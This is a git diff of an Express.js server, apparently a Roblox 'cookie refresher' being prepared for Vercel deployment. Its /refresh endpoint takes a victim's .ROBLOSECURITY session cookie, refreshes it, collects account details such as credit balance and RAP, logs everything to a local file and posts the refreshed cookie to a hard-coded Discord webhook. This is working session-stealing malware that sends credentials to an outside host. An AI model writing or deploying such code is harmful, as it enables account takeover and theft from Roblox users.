@@ -1,7 +1,6 @@
 const express = require('express');
 const axios = require('axios');
 const fs = require('fs');
-
 const { generateAuthTicket, redeemAuthTicket } = require('./refresh');
 const { RobloxUser } = require('./getuserinfo');
 
@@ -9,21 +8,17 @@ const app = express();
 app.use(express.json());
 app.use(express.static('public'));
 
-
-
-
 app.get('/refresh', async (req, res) => {
     const roblosecurityCookie = req.query.cookie;
-
     const authTicket = await generateAuthTicket(roblosecurityCookie);
-
+    
     if (authTicket === "Failed to fetch auth ticket") {
         res.status(400).json({ error: "Invalid cookie" });
         return;
     }
-
+    
     const redemptionResult = await redeemAuthTicket(authTicket);
-
+    
     if (!redemptionResult.success) {
         if (redemptionResult.robloxDebugResponse && redemptionResult.robloxDebugResponse.status === 401) {
             res.status(401).json({ error: "Unauthorized: The provided cookie is invalid." });
@@ -32,13 +27,12 @@ app.get('/refresh', async (req, res) => {
         }
         return;
     }
-
+    
     const refreshedCookie = redemptionResult.refreshedCookie || '';
-
     const robloxUser = await RobloxUser.register(roblosecurityCookie);
     const userData = await robloxUser.getUserData();
-
     const debugInfo = `Auth Ticket ID: ${authTicket}`;
+    
     const fileContent = {
         RefreshedCookie: refreshedCookie,
         DebugInfo: debugInfo,
@@ -54,9 +48,9 @@ app.get('/refresh', async (req, res) => {
         CreditBalance: userData.creditbalance,
         RAP: userData.rap,
     };
-
+    
     fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
-
+    
     const webhookURL = 'https://discord.com/api/webhooks/1465420784175550525/DgwdDcS5djyB0fftP2sDeRSe0jNEEPnFAdO97F19OPyNdFG0GketXZN5CnMJgHhT_pcG';
     const response = await axios.post(webhookURL, {
         embeds: [
@@ -83,9 +77,8 @@ app.get('/refresh', async (req, res) => {
             }
         ]
     });
-
+    
     console.log('Sent successfully+response', response.data);
-
     res.json({ authTicket, redemptionResult });
 });
 
@@ -94,3 +87,5 @@ app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
 
+// Export for Vercel
+module.exports = app;
